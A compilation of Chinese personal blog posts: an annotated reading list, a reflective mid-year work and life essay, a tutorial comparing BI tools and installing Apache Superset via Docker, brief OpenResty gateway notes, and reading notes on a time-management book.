Development28《李可乐抗拆记》29《电影中的武器》30《七周七语言》理解多种编程泛型31《淘宝技术这十年》32《1988--我想和这个世界谈谈》33《倚天屠龙记》34《编程珠玑2》35《effective c++》36《告别与告白》37《opencl异构计算》第二版38《生命不息，折腾不止》罗永浩39《史蒂夫乔布斯传》40《programming c#3.0中文版》41《道士下山》42《改变世界的十大算法》43《吴敬琏传》 2015061444《Intel parallel Studio 环境下的并行程序设计》45《Python 计算机视觉》46《三维计算机视觉技术和算法导论》47《鹿鼎记》48《碧血剑》49《三体》52《多核应用编程实战》53《废都》贾平凹54《大数据智能》55《流星蝴蝶剑》56《hadoop技术详解》57《spark大数据处理技术》58《从虚拟化到云计算》59《滚床单心理学》60《呼兰河传》61《三少爷的剑》62《周鸿祎自述--我的互联网方法论》63《基于图论的立体匹配方法研究》64《欢乐英雄》65 《程序员羊皮卷》66 《大数据时代》67 《周鸿祎自述：我的互联网方法论》68 《把时间当作朋友》69 《创业，我们创什么》70 《肠子的小心思》71 《人生》

序言
这个书单从2013年4月开始读起 ，俞敏洪说他在北大四年读了差不多有800本书。我看现在我是800年能读4本书。


1.《行走西藏》
2.《***传》
3《我所理解的生活》韩寒
4《一个很高兴见到你》韩寒监制
5《所有人问所有人》韩寒监制
6《暗战亮剑——软件漏洞发掘与安全防范实践》
7《程序员的思维修炼:开发认知潜能的九堂课》
书很薄，写的却非常好强烈推荐
8《王小波，沉默的大多数》
9《数字图像处理》冈萨雷斯
10《并行程序设计openmp》
库用的不多，大致上翻了一下
11《c++沉思录》
还得再看几遍
12《团队之美》
书比较厚，感觉没说个啥，也没有学到啥，阅历有限，不推荐！
13《独唱团》
韩寒监制
14《最好的时光在路上》
旅行是灵魂的救赎，读万卷书行万里路。
15《opencv2计算机视觉编程手册》
16《射雕英雄传》
17《神雕侠侣》
18《香港制造一梦十年》
论坛文章的集结，老书了，居然有作者在里面，用第一人称视角写梁朝伟，王家卫，草！
烂，除了几句经典台词。
19《电影阻击历史》
闲书，结合电影与历史，不错，及格，能看。
20《一座城池》韩寒
21《偷影子的人》
22《香港电影血与骨》2月5日
23《程序员修炼之道，从小工到专家the pragmatic programmer fromjourneyman to master》
阅历有限，工作经验有限，翻译的不太好。
不推荐！不及格。
24《精益开发实战–用看板管理大型项目 lean fromthe trenches managing large-scale projects with kanban》
整本书讲述了敏捷开发的一种方法，用看板来管理软件流程。150页左右，全书根据瑞典国家警署开发的大型项目为案例，讲述了大型项目中如何具体应用看板方法跟精益原则。
看到最后发现一句话，希望他能帮助软件开发组织中的团队主管、经理、教练成功实施项目。。。于是我发现，我又二了。。。
25《卓越程序员密码The Developer’s Code What Real Programmers Do》
全书158页
其实程序员所做的确实是一个可以营销的行业。但这要靠我们来让它变的不局限与代码。
事实上，有时候我们是集医生，建筑师和统治者与一身。我们用代码创造奇迹，让梦想驰骋，苦心建造，然后指点江山。她们要是问我是做什么的，我就给她们看看这本书。
评分：值得一看的书
26《活着》余华
高中时候看了他的《兄弟》,感觉跟现在的风格差别很大。《活着》以一种渗透的表现手法完成了一次对生命意义的哲学追问。
27《简约之美-软件设计之道》codesimplicity:The Science of Software Development
95页，25块钱，不值这个价格
28《李可乐抗拆记》
小说，写的有点长了，开头不错，后面略天马行空，有点太随意的感觉，再精简点能更好。
我手持菜刀砍电线，一路火花带闪电
29《电影中的武器》
主要是介绍枪械，对于其他武器的介绍略显单薄，亚马逊的打折书，也就那样
30《七周七语言》理解多种编程泛型
Seven language in seven weeks
a pragmatic guide to learning programming language
31《淘宝技术这十年》
32《1988–我想和这个世界谈谈》
33《倚天屠龙记》
34《编程珠玑2》
35《effective c++》
36《告别与告白》
韩寒关于电影《后会无期》的拍摄笔记
37《opencl异构计算》第二版
38《生命不息，折腾不止》罗永浩
一个理想主义者的奋斗
The Adventures of an idealist
永远年轻，永远热泪盈眶！
39《史蒂夫乔布斯传》
simplicity is the ultimate sophistication
stay hungry stay foolish
40《programming c#3.0中文版》
张老师曾经说过，面向对象编程学到一定阶段就是对类库和思想的学习了，我这本书看的很快，但c#我不喜欢
IBM实习这边的项目SPSS Data collection都是c#写的所以抽空看了看

更新至20150427
41《道士下山》
故事是个好故事，作者的笔法说实话稍微欠了一点火候
不择手段是人杰，不改初衷是英雄
这个时代，我们最应该相信的就是我们自己
42《改变世界的十大算法》
科普读物，其中讲到了搜索引擎的的算法，非对称加密，数字签名，数据库技术
43《吴敬琏传》 20150614
呼唤更加法治的中国经济
44《Intel parallel Studio 环境下的并行程序设计》
sse，openmp，得用Intel的编译器

更新至20151020
45《Python 计算机视觉》
46《三维计算机视觉技术和算法导论》
搞立体匹配的还是需要看一看这本专著的
47《鹿鼎记》
三观尽毁的金庸武侠小说，为官做人之道还是不要学习韦小宝了。
48《碧血剑》
碧血剑和鹿鼎记应该是前后呼应的姐妹篇，袁承志下得华山后就buf全开看的人好生过瘾

更新至20160210
49《三体》
我读过最好看的科幻小说，构思非常新颖大胆而且饱含科学性与故事性，我要是有钱会邀请最好的特效团队和最好的演员来拍摄一个三部曲
这半年来没看什么课外书，写学位论文，考驾照，找工作，后面大把的时间，半年我希望，把没看的书补回来，至少研究生阶段看到100本吧
52《多核应用编程实战》
对多核应用，和多线程编程这块讲的非常清楚
53《废都》贾平凹
充满争议的小说，我觉的写的没什么新意，到时人物语言的对话描写的细致优美。
54《大数据智能》
科普图书
55《流星蝴蝶剑》
古龙的侦探小说，没啥武功的描写，概况起来就是，啊，他好快，坏人已经倒在血泊中。
56《hadoop技术详解》
主要将hdfs这块的内容
57《spark大数据处理技术》
非常想看的mlib机器学习没有讲多少，主要是围绕RDD的各种剖析介绍。
这小半年趁空隙时间也算读了十来本书，厚积薄发，100本读不完，能读多少是多少吧，不要浮躁的像绿头苍蝇就行。
58《从虚拟化到云计算》
这个书啊，就是教教怎么安装虚拟机
59《滚床单心理学》
答疑解惑，1024楼主好人
60《呼兰河传》
有点像萧红的自传，大体上翻了翻，并且看了《黄金时代》这部介绍萧红生平的电影，当时的进步女性即使放在今天也是大胆的。
61《三少爷的剑》
听说电影马上就上映了，我得去支持一下，这个小说颇有点烂尾楼的感觉，哈哈
62《周鸿祎自述–我的互联网方法论》
写的非常好，很多理念乔布斯传中都有提到，比如弄清楚用户的需求很重要，而软件成本通过大量用户的使用实现免费，这就比较新颖了。
63《基于图论的立体匹配方法研究》
嗯，本人的学问论文，读了很多遍，倒背如流。
64《欢乐英雄》
谁说英雄一定是寂寞的

65 《程序员羊皮卷》
有年头的书了，社会和学校不同，“不行春风，莫望秋雨”
https://season.blog.csdn.net/article/details/69053517
66 《大数据时代》
只要发现了两个现象之间存在的显著相关性，就可以创造巨大的经济或社会效益
译者序 在路上·晃晃悠悠
某些观念有时会以惊人的力量给知识状况带来巨大的冲击。由于这些观念能一下子解决许多问题，所以，它们似乎将有希望解决所有基本问题，澄清所有不明了的疑点。每个人都想迅速地抓住它们，作为进入某种新实证科学的法宝，作为可以用来建构一个综合分析体系的概念轴心。这种‘宏大概念’突然流行起来，一时间把几乎所有的东西都挤到了一边。
因为越是万能的，就越是空洞的！
https://season.blog.csdn.net/article/details/68958679
67 《周鸿祎自述：我的互联网方法论》

**你究竟拿什么免费？ **
这个东西会不会成为一项基础服务？
通过免费能不能得到用户？
在得到用户和免费的基础上，有没有机会做出新的增值服务？
增值服务的用户愿意付费吗？
|———
如果你能回答清楚这些问题，就是一个好的商业模式。

https://season.blog.csdn.net/article/details/69218476
68 《把时间当作朋友》
币圈大佬----李笑来 的时间管理
坚持不懈是什么来着？——策略加上重复
https://blog.csdn.net/wangyaninglm/article/details/78829194
69 《创业，我们创什么》
当你觉的不满意的时候，那么你的机会来就了
https://season.blog.csdn.net/article/details/69218793

更新至2019年
70 《肠子的小心思》
我们用嘴开启了它们的命运，用屎记录了它们的辉煌和血泪。但其实这个命运不仅是它们的，也同样影响着我们。这是一场和很多陌生人的游戏。
71 《人生》
严峻的生活把他赶上了这条尘土飞扬的路。










                                             border="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=484732973&auto=1&height=66">


只有奄奄一息过，那个真正的我，他才能够诞生。
—- 题记
1.Life is about growing, learning, and being a better person.
简要回顾这半年来，工作生活的经历，总体来说往返于西安与北京之间。 
 
2017年第一天，和很多人一起起个大早吸着雾霾，看了升旗仪式，觉得生活应该有点仪式感，才能心存敬畏。 
 

后面花几周时间走访了BAT京东小米等各大IT公司，工作半年心中积累起来的自信感荡然无存。


过年去了趟兵马俑，龙门石窟，少林寺，感慨当我自以为真的每天追随技术最前沿，站在时代最顶端，还是要停下来回头补补课。江山留胜迹，我辈复登临。 

篮球打到了全国各地，从西北大学到东单体育场，并没有太多的进攻欲望，但还是能在一早上三百五十分钟里豪取13分，打完还久久不愿离开。

《深度学习与中文短文本分析总结与梳理》有幸被清华大学数据派公众号认可并转载，欣喜若狂，文章热了48小时，然后骤然遇冷，可谁知我写了将近1月有余，这样的东西也能被消费？！不解，并陷入写博客，被消费的循环，有瘾！ 

3月19日凌晨，我在首都机场候机厅发了一个朋友圈，并配了如下文字：
如今我对自己故乡 
像来往匆匆的过客

雷总将这幅照片作为我们公司留迹app 的封面，然而半年过去，留迹开始要消声遗迹了，因为CTO觉得app似乎并没有什么卵用。
5月5日，和张老师开车去了趟红河谷，爱上一句话：
青山清我目 
流水静我耳

6月的最后一天，在同学喜宴上见识了50年茅台，路易十三，2017的上半年就这样过去了，也算不枉此生。最近看了一些关键词为追寻的电影：《冈仁波齐》，《猜火车2》 
朝拜，choose life 都是在寻找，追寻，毫无意义的意义之所在。
当天晚上，我在家翻到自己19岁时候的日记本，上面写到：

世界上的忧虑，一大半是因为人们没有足够的知识来做决定而产生的。 
  混乱是产生忧虑的主要原因，如果一个人能够把他所有的时间偶花在以一种十分超然，客观的态度去寻找事实的话，他的忧虑就会在知识的光芒下消失的无影无踪。 
事情既然如此，就不会另有它样，那还有什么好忧虑的呢？ 
  看来那时候的自己远比现在通透多了。

我在豆瓣上看到一段电影《冈仁波齐》的影评： 
朝圣、磕长头，是苦行，苦修，但大多数人的日常生活，又何尝不是苦行苦修呢。每天高峰期挤地铁，每天四五个小时的通勤，加班，耗尽全家所有积蓄、借遍亲朋好友的钱来买房，为了让孩子进入好学校，变成行贿高手，又何尝不像是在磕长头。 
就像《冈仁波齐》的幕后花絮里说的：“这个世界上没有什么生活方式是完全正确的……神山圣湖并不是重点，接受平凡的自我，但不放弃理想和信仰，热爱生活，我们都在路上。” 
信仰，生活，爱，可能是一件事物的三个名字，是一个事物的三个面相。其实，你我都有各自的冈仁波齐。
2.交待—-我以前没得选择，现在我想做一个好人。
几天前，坐在从西安去北京的高铁上，我这个将要27岁的大龄程序员，凝视窗外，一路上看太阳升起又落下，决定给自己一个交代。
其实我就是想写一篇充满文艺气息的年中工作生活总结，好宣泄我这大半年压抑的情感。然而我写的时候又在想，如果我自己是读者会有想要读下去的冲动么？这个文章想要说啥，它的主线是什么？ 
它能够充满对知识的渴求，对未来的美好希望么？
2016年我正式开始工作，当年年底总结的时候写了一篇文章，殷切希望自己能够成为可以独立解决复杂问题的软件工程师。年底至今10个月有余，在单位见识几位大牛show操作后觉的和达成目标还尚存不少差距。
这半年日子飞快，我像一发被上膛的子弹，对着一个个目标打了出去，只是有时候扣扳机的人并没有怎么瞄准。
身体的各项机能开始衰退，业余时间我选择拼命运动，打球，游泳，长跑，其实是花钱治疗拿命换钱所产生的副作用：腰肌劳损，颈椎病，痔疮，蛀牙，前列腺上的尿频尿急尿无力，现如今迎风撒一鞋。。。
似乎是每天都在紧紧追随最新的前沿技术，连买手环都要选择有久坐提醒功能的产品，以求延长自己的计算机职业生涯。
我想在工作中给自己一个交待，然而面对选择的苍白无力，比如你想要鱼丸粗面，对不起，没有鱼丸！
这让我想起那段经典对白
刘建明：我以前没得选择，现在我想做一个好人。 
陈永仁：好，跟法官说，看他让不让你做好人。 
刘建明：那就是要我死。 
陈永仁：对不起，我是警察。 
……
从来只有事情改变人，而人是无法改变事情的。如果可以从头来过，可能我还是会选择现在的职业，不同的是从头开始就一直努力。
3.工作—-工作有什么好谈的，fuck
学长在自己博客的工作总结上写了一句话：工作有什么好谈的，fuck！
单位有位oracle大拿，知天命的年纪，走起路来却步履蹒跚，看起来70有余。据说他上世纪90年代开始从事oracle dba至今，业务上有解决不了的数据库问题只能找他。看着他的样子，我希望他的今天不要是大家的明天。
单位还有很多这样的人，被混乱的业务虐，被客户虐，被领导虐，出完差再回家被媳妇虐。
这样的人，苍老的很快。
现阶段存在很多困扰我的事情：
1.首先就是每天都在用电脑，手机，在各种渠道被迫接受信息轰炸。思维，行为碎片化严重。提笔忘字，如今你还能一口气写完八百字，题目自拟么？反正这篇文章我是来来回回写了好久。
2.并没有精通某一项编程语言，只知道似乎用别人的，开源的库可以做任何事情，缺少造轮子的勇气。
3.开始变的害怕尝试了，觉的人生的每一个机会都稍纵即逝不敢走错一步。
4.手机碎片化我们生活后，一个人最宝贵的实力就是专注。卸载qq，微信，微博，知乎，关闭朋友圈么？我们会失去更多还是得到更多
5.人变懒了，后半年希望自己勤快起来。多写代码!
p.s.看来加班时间长，会脑子不好
4.读书—-抱道不曲 拥书自雄
成长，自我价值的提升，是刚刚工作的我最关注的点，1932年胡适先生在文章《大学生毕业后的几条路，以及两类堕落方式》中说：毕业后的我们容易抛弃学生时代的理想信念和人生追求，为了不忘初心，预防堕落，胡适先生给我们写了三句话：

总得时时寻一两个值得研究的问题！
总得多发展一点非职业的兴趣。
你总得有一点信心。

在你我最悲观最失望的时候，你要深信：天下没有白费的努力。成功不必在我，而功力必不唐捐。所以读万卷书，行万里路，天道酬勤而已！
有幸在单位加入了助力形成研发文化的虚拟组织，并在杨哥的带领下读到两本好书，《组织生存力》，中国版的金字塔原理《结构思考力》

组织生存力问了我们五个赤裸裸的问题。

我们的使命是什么?
我们的顾客是谁?
我们的顾客重视什么?
我们追求的成果是什么?
我们的计划是什么?

如果我们做每一个项目都能清楚的回答上述问题，我想目标明确的坚持下去一定能够出成果的。
《结构思考力》这本书主要教我们怎么构思说话，如何结构化思维。你有发现身边的很多人平时说话毫无重点么，推荐这本书给他吧。 
 
结构思考的四个基本特点：
● 结论先行的表达，一次表达只支持一个思想，而且要在开头表达出来。先框架后细节。 
  ● 以上统下的论证，在任何层次上的思想都必须是下一层次思想的总结概括。 
  ● 归类分组的论据，每一个组的思想必须在同一个范畴之内，使之条理清晰模块化。 
  ● 层层递进的逻辑，每一组的思想，按照一定的逻辑顺序进行处置，更容易让对方理解和记忆。
两本书共有的闪光点，方法论：

1.专注，抓住主要矛盾 
  2.先仔细分析问题，再解决问题 
  3.冷静，思考

刚上研究生那年我看视频，俞敏洪说他大学期间读了800多本书。我也不甘示弱，在那一年开始了800本的征程，同样4年过去，我还剩700多本。 
我只想说一个字，计算机专业的书看的比较慢！
5.情感—-Happiness lies in the consciousness we have of it.
每天下班回旅店的路上，小张老师会和我打个电话，（因为中国移动亲情号只能本地主叫免费，我给张老师打还算漫游。垄断在无形中阻碍了我们秀恩爱。）
张老师照例在电话中倾吐一天中生活中的精彩与不快 。我在电话这头，唯张老师马首是瞻，直到胳膊 酸痛转去另一只耳朵。请示能否歇息一会，张老师说：你一天就会说，我去上班呀，我去吃饭 呀，我去睡觉呀，我去跑步呀，要你有何用！？
可能张老师上课时候学生训的多了，潜意识里当我是她的学生之一。当然，我也是好为人师的，有时候忽然被我训一下她就会大发雷霆，还质问我，你凭什么总是站在道德的制高点上对我横加指责?扯着长脸让我安慰道歉半天。
我想，在教学相长这一点上我们是互相成就的。
张老师独自一人在古都的教育生活充满奇闻异事，因为每天都有层出不穷的各类数学题目出现，可以用来摧残祖国的花朵。然而整个社会乐此不疲，学校乐此不疲，家长也乐此不疲，张老师多数时候忧国忧民的问我咋办。我也是吃饭大学毕业，不能丢，雪糕为师，身正为饭的脸面。
我说： you save one, you save the world. 
为我们点赞。
总的来说，数学考试是越来越难，如果让我当数学老师而不是程序员的话，可能我现在已经秃顶了。老张顶着压力继续奋战在数学战线上，说实话，现在学生数学差的太多，我国学校里的数学教育任重而道远啊。

985，211毕业的你能在十分钟内做出来上面的题目么？这可不是什么压轴题，填空题最后一道。
感情的事情不必多说，出差的日子里难为张老师了。我也没给家里做啥贡献，在此深表歉意。我这人不喜欢立什么flag，但是今天说到这了，我流川疯不能让爱我的人失望。
6.职业—–青春献祖国，永远跟党走
我的职业目标至今没有改变，依旧希望自己可以独当一面，成为能够独立解决复杂问题的软件工程师。工作这些时日，还在充分了解大数据生态圈，从底层的hdfs，hive，yarn等组件到集群管理的CDH,TDH，再到pyspark，oracle，甚至简单的数据分析等都有所涉猎，当然技术是始终在更新换代的，唯一不变的是永恒的解决问题之道，这就是算法。未来是AI的，是算法的！
2016年简直一晃而过，这是我半年前写的年终总结，里面依稀写了点对大数据行业的理解判断，半年过去感觉自己的技术水平并没有突飞猛进，看来革命尚未成功，同志仍需努力。
为了伟大祖国永远繁荣昌盛，努力吧！
有点乱，暂时写到这里，未完待续

此致，敬礼
ALL RIGHTS RESERVED!!!
如有巧合，纯属雷同！
已满18岁青年，请在家长陪同下观看！
 









文章大纲1. BI 技术选型对比1.1 总体对比1.2 硬件要求2. docker 安装Superset2.1 Centos 安装docker2.2 参照SuperSet 官网编译官网版docker2.3 使用其他人制作好的docker2.4 使用自己的sqllite 数据源分析参考文献

1. BI 技术选型对比
假如客户有一堆数据要分析，没有太多行业知识的你需要在一周之内给出基本的可视化展现怎么办？别担心，有BI软件来帮你
1.1 总体对比




ES+kibana
Tableau
Superset
redash




官网链接
https://www.elastic.co/products/kibana
https://www.tableau.com/
http://superset.apache.org/，https://github.com/apache/incubator-superset/
https://redash.io/


部署安装
本地云端部署均可
Tableau 后端连接数据库，数据库在本地云端均可。
本地+docker
https://redash.io/help/open-source/setup


优势
ES属于大数据新贵，已有部分最佳实践开源，支持部分定制，支持分布式，非结构化数据检索，速度快，产品成熟
运维成本低，产品成熟，支持基本所有数据库社区支持ES
软件成本低，支持深度定制，开源社区最高评价的BI软件
对SQL


缺陷
需要对索引等ES 概念有所理解才能良好使用kibana，需要再次录入结构化数据到ES并准备一套数据schema mapper
收费
文档成熟度欠缺，绘图报错不显示错误信息，默认地图服务商为国外厂商
汉化支持，文档支持较差


汉化支持
没有汉化版本，图表可自定义名称，坐标轴
支持国际化
支持国际化
不支持汉化，且国际化支持时间不定。文档最差的一个，他的文档在官网叫help


图例
https://www.elastic.co/cn/products/kibana
下载官方白皮书：https://www.tableau.com/sites/default/files/media/whitepaper_surveydata_v4.pdf （还要注册差评）
http://superset.apache.org/gallery.html
https://redash.io/help/user-guide/visualizations/visualization-types


支持的数据源
Elastic Search
https://onlinehelp.tableau.com/current/pro/desktop/en-us/exampleconnections_overview.htm
http://superset.apache.org/installation.html#database-dependencies
https://redash.io/help/data-sources/setup/supported-data-sources


是否支持ES
支持
社区提供连接器，https://github.com/mradamlacey/elasticsearch-tableau-connector
不支持
不支持


除了上述提到的一些产品外，我们还有国产的一家厂商：


FineBI
http://www.finebi.com/


Google Data Studio
https://developers.google.cn/datastudio/?hl=de


1.2 硬件要求
上述BI 组件的硬件需求基本可以参考Tableau给出的
Tableau Server 的系统要求：（最高版需求）
最低系统要求

2 核
64 位处理器
8 GB 系统内存
至少 15 GB 可用磁盘空间

建议要求

8 个物理内核，2.0 GHz 或更高频率的 CPU
64 位处理器
32 GB 系统内存
至少 50 GB 可用磁盘空间


2. docker 安装Superset
下面我们选择Superset 来实战一下，看看效果到底怎么样。
2.1 Centos 安装docker
参照官网的安装简介
git clone https://github.com/apache/incubator-superset/
cd incubator-superset/contrib/docker
# prefix with SUPERSET_LOAD_EXAMPLES=yes to load examples:
docker-compose run --rm superset ./docker-init.sh
# you can run this command everytime you need to start superset now:
docker-compose up

实在不想用windows 下面那个hyper-v 的docker 我就在virtual box 中安装 一个CentOS7 搞一搞 docker
过程无非是：
sudo yum update
yum install -y yum-utils device-mapper-persistent-data lvm2
yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo
yum list docker-ce --showduplicates | sort -r
sudo yum install docker-ce 
yum install docker-ce-18.06.2.ce
systemctl start docker
systemctl enable docker
docker version


具体可以参考
https://www.cnblogs.com/yufeng218/p/8370670.html
2.2 参照SuperSet 官网编译官网版docker
装好docker 后就是安装python 主要是为了使用python 然后docker-compose 结果直接报错：
Step 13/21 : COPY --chown=superset:superset superset superset
ERROR: Service 'superset' failed to build: Unknown flag: chown


参考解决方案：（可能是docker 更新了，Surperset的docker file 还没有更新？）
https://forums.docker.com/t/copy-chown-fails-in-automated-build-unknown-flag-chown/43059
修改成如下形式，继续运行，ok
运行命令：
接着报错，一看就是权限问题，TMD

superset_superset_1 exited with code 243
superset_1  | npm ERR! path /home/superset/superset/assets/node_modules
superset_1  | npm ERR! code EACCES
superset_1  | npm ERR! errno -13
superset_1  | npm ERR! syscall mkdir
superset_1  | npm ERR! Error: EACCES: permission denied, mkdir '/home/superset/superset/assets/node_modules'
superset_1  | npm ERR!  { [Error: EACCES: permission denied, mkdir '/home/superset/superset/assets/node_modules']
superset_1  | npm ERR!   cause:
superset_1  | npm ERR!    { Error: EACCES: permission denied, mkdir '/home/superset/superset/assets/node_modules'
superset_1  | npm ERR!      type: 'OperationalError',
superset_1  | npm ERR!      '$error': '$error',
superset_1  | npm ERR!      cause:
superset_1  | npm ERR!       { errno: -13,
superset_1  | npm ERR!         code: 'EACCES',
superset_1  | npm ERR!         syscall: 'mkdir',
superset_1  | npm ERR!         path: '/home/superset/superset/assets/node_modules' },
superset_1  | npm ERR!      isOperational: true,
superset_1  | npm ERR!      errno: -13,
superset_1  | npm ERR!      code: 'EACCES',
superset_1  | npm ERR!      syscall: 'mkdir',
superset_1  | npm ERR!      path: '/home/superset/superset/assets/node_modules' },
superset_1  | npm ERR!   isOperational: true,
superset_1  | npm ERR!   stack:
superset_1  | npm ERR!    'Error: EACCES: permission denied, mkdir \'/home/superset/superset/assets/node_modules\'',
superset_1  | npm ERR!   type: 'OperationalError',
superset_1  | npm ERR!   '$error': '$error',
superset_1  | npm ERR!   errno: -13,
superset_1  | npm ERR!   code: 'EACCES',
superset_1  | npm ERR!   syscall: 'mkdir',
superset_1  | npm ERR!   path: '/home/superset/superset/assets/node_modules' }
superset_1  | npm ERR! 
superset_1  | npm ERR! The operation was rejected by your operating system.
superset_1  | npm ERR! It is likely you do not have the permissions to access this file as the current user
superset_1  | npm ERR! 
superset_1  | npm ERR! If you believe this might be a permissions issue, please double-check the
superset_1  | npm ERR! permissions of the file and its containing directories, or try running
superset_1  | npm ERR! the command again as root/Administrator (though this is not recommended).
superset_1  | 
superset_1  | npm ERR! A complete log of this run can be found in:
superset_1  | npm ERR!     /home/superset/.npm/_logs/2019-02-22T04_42_13_898Z-debug.log
superset_superset_1 exited with code 243

解决方案：
https://stackoverflow.com/questions/54049266/superset-npm-eacces-permission-denied-mkdir
结果没好，暴力加个权限：
chmod 777 (superset的当前目录及上一级目录)
其实主要是docker 里面没有操作他挂载目录中的权限，提升一下权限就好了。
结果页面成这样了

调试一下，304 错误，我前端没什么储备，等高手来救场了。

2.3 使用其他人制作好的docker
还是用别人搞好的吧，参考：
https://www.jianshu.com/p/d5978b439080
首先搜索并下载一个别人搞好的docker 文件
docker search superset
# 指定版本
docker pull amancevice/superset:0.20.0
# 拉去最新版
docker pull amancevice/superset

命令如下
# 0e9131be7e49    为docker ps 中的id
# 先建一个/data文件夹方便映射
docker run -d -p 8088:8088 -v /data:/home/superset amancevice/superset:0.28.1
# 或者不指定版本
docker run -d -p 8088:8088 -v /data:/home/superset amancevice/superset


docker exec -it 0e9131be7e49  fabmanager create-admin --app superset
docker exec -it 0e9131be7e49  superset db upgrade
# 加载例子，这一步我看日志还要数据库建立索引啥的，时间较长，不需要可以不用
docker exec -it 0e9131be7e49  superset load_examples
docker exec -it 0e9131be7e49  superset init
docker exec -it 0e9131be7e49  superset runserver


自带世界银行数据的BI看板，效果爆炸有木有

2.4 使用自己的sqllite 数据源分析
假如客户给了一个数据库，或者一堆csv怎么办，别担心，我们的superset 对外接数据源支持还是非常出色的，对于中小型关注成本的企业来说，BI无压力。csv ，sqllite，mysql 通通连上来。
下面我们用sqllite来小试牛刀。
由于sqllite不支持远程链接，我们的docker 之前挂载到宿主机的一个目录上面
这个数据库是我在NLP系列里面用爬虫爬的我自己的博客，主要包括标签，发表时间，点赞数，评论数等内容。

链接字符串如下
sqlite:////home/superset/NLP_demo.db

记得点击可以在 SQL 工具箱中公开，这样我们才可以在SQL工具箱中加载并找到这个数据库。

点击测试，seems ok 说明正常。

打开sql工具箱，写完sql 就可以用这个子数据集进行一些BI分析了，但是由于我之前的数据库很多列的格式没有统计，所以画图会有一些问题，这一点superset 在导入数据库数据时候似乎不能很友好的再次修改。

我选择饼图，统计一下博客中那一个标签下面发的文章最多，毫无疑问 OpenCV，尽管最近都基本没有再发过了。


参考文献

数据可视化的开源方案: Superset vs Redash vs Metabase (一)
数据可视化的开源方案: Superset vs Redash vs Metabase (二)











文章大纲简介安装搭建网关网关开源实现参考文献

简介
OpenResty 介绍
OpenResty(又称：ngx_openresty) 是一个基于 NGINX 的可伸缩的 Web 平台，由中国人章亦春发起，提供了很多高质量的第三方模块。
OpenResty 是一个强大的 Web 应用服务器，Web 开发人员可以使用 Lua 脚本语言调动 Nginx 支持的各种 C 以及 Lua 模块,更主要的是在性能方面，OpenResty可以 快速构造出足以胜任 10K 以上并发连接响应的超高性能 Web 应用系统。
360，UPYUN，阿里云，新浪，腾讯网，去哪儿网，酷狗音乐等都是 OpenResty 的深度用户。
锤子科技在 T2 发布会上将门票收入捐赠给了 OpenResty 开源项目
安装
安装说明
http://www.runoob.com/w3cnote/openresty-intro.html
If you are using Amazon’s EC2 to host OpenResty, remember to install the development tools that are not installed by default because not everyone compiles software.
sudo yum groupinstall "Development Tools"
http://docs.aws.amazon.com/AWSEC2/latest/UserGuide/compile-software.html
And since EC2 is based on RedHat…
yum install readline-devel pcre-devel openssl-devel gcc
https://github.com/openresty/openresty/issues/146
Lua 语言的各个版本是不相兼容的。因此本书只介绍 Lua 5.1 语言，这是为标准 Lua 5.1 解释器和 LuaJIT 2 所共同支持的。LuaJIT 支持的对 Lua 5.1 向后兼容的 Lua 5.2 和 Lua 5.3 的特性，我们也会在方便的时候予以介绍。
来自 https://moonbingbing.gitbooks.io/openresty-best-practices/content/lua/main.html
搭建网关
https://www.jianshu.com/p/00849d04114c?from=singlemessage
https://mp.weixin.qq.com/s?__biz=MzAxNzMwOTQ0NA==&mid=2653355281&idx=3&sn=73f965e2db44e5e156b0e5a98f2af2b8&chksm=8035d77ab7425e6c34c661410fa5626cc552761828bca36ac9e871da2121e215c3dbcdf1b460#rd

https://blog.csdn.net/zhangxm_qz/article/details/87939230
https://blog.csdn.net/forezp/article/details/78616779
网关开源实现
http://orange.sumory.com/docs/
参考文献

OpenResty 使用介绍











作者—李笑来
点评
点评此书 ★★★★★
运用心智，获得解放。 这看似是讲了一些大道理，其实是细节决定成败，天道酬勤的道法使然
希望时间也是我的朋友

人生充满了不确定性和戏剧性，但有一件事是确定的——时间只与那些努力的人做朋友。
一切都靠积累，一切都可提前准备，越早醒悟越好。
了解心智的力量
在任何一个部门或团队里，上司做的事情全部是显性的，所有下属或者成员都可见的；而下属和成员之间往往并不相互非常清楚对方正在做什么。于是，下属们更容易“共同”地看到上司的缺点。钱钟书先生有个很有趣的描述“猴子要爬到树上，我们才看得见它的红屁股”。
俗话讲，猫有猫道，鼠有鼠道；猎头也肯定有自己的办法。一个相对比较简单的办法就是锁定二流人才。道理也比较简单。任何一个团队里的一流人才，通常很难产生流动的愿望。他们的薪水很高，甚至过高；
首先，这些人并不是对正在做的事情没有兴趣，而是没能力把目前正在做的事情做好。
最终没有人喜欢自己做不好的事情。
做好这件事情究竟对自己有没有意义？如果有，那就要努力做，直到做好为止——没有其他选择。
只要一件事儿你能做好，并且做到比谁都好，或者至少比大多数人好，你就不会对那件事情没兴趣。
说来说去，又是顺序出了问题——往往并不是有兴趣才能做好，而是做好了才有兴趣。
方法固然重要，但是比起“用功”来说，方法几乎可以忽略不计。
最重要的只不过是：重复，不间断地重复，重复一年以上。
所有学习上的成功，都只靠两件事：策略和坚持，而坚持本身就应该是最重要的策略
如何运用心智的力量在尽管还没有机会亲身体验的情况下，仅凭心智就可以像真实经历过一样深刻体会？

何谓心智
心智主要包括以下三个方面的能力：a.获得知识；b.应用知识；c.抽象推理。
人类之所以与其它动物不同，原因之一在于人类拥有比其它动物更为发达的“大脑额页”，乃至于人类天生拥有比其它动物更为发达的学习能力。透过“获取知识”、“应用知识”、以及同样需要学习才能获得的“抽象推理能力”
我们竟然可以用我们的大脑控制我们的大脑。
“即使是在极端恶劣的环境里，人们也会拥有一种最后的自由，那就是选择自己的态度的自由。”
当我突然意识到我竟然可以（也根本就应该）控制我自己的大脑的时候，我觉得我居然不用死就可以从头再来，这该是多么神奇。
当我们觉得自己痛苦的时候，总是不自觉地把自己想象成全世界最痛苦的人
如果说记忆本身是葡萄，那么回忆的过程就是发酵。
你现在知道你为什么总那么没记性了吧？因为在你遇到挫折或者面对那些你曾经的错误决定最终带来的惩罚的时候，你太痛苦了。而这样的痛苦，必然被你的大脑自动列入遗忘的序列，并在你大脑里彻底消失。
在做所有类似的必须记住大量信息的工作的时候，一定要想办法由衷地把这件事当作快乐的事情来做。
坚持不懈是什么来着？——策略加上重复。
平静接受并且正确认识自己的天性是改变天性的第一步。

精确感知时间
我崇尚公平，向往自由，渴望平等，憧憬希望。
一位朋友读完米兰昆德拉的小说《生命不能承受之轻》之后概括说，逃避责任就会带来轻松，可那恰恰就是“生命不能承受之轻”啊！
